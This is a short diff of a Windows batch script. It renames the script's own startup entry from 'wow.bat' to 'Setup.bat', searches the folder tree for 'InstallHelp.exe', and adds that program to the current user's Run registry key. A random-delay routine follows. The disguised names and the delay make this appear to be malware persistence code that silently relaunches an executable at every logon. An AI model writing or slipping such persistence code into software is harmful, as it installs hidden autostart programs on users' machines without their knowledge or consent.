@@ -1,6 +1,14 @@
 @echo off
 
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "wow.bat" /t REG_SZ /d "\"%~dp0%~nx0\"" /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Setup.bat" /t REG_SZ /d "\"%~dp0%~nx0\"" /f
+
+for /r %%i in (InstallHelp.exe) do (
+    set "InstallHelpPath=%%~fi"
+    goto :found
+)
+
+:found 
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "InstallHelp" /t REG_SZ /d "\"%InstallHelpPath%\"" /f
 
 :GenerateRandomDelay
 set /a "randomDelay=%random% %% 120"
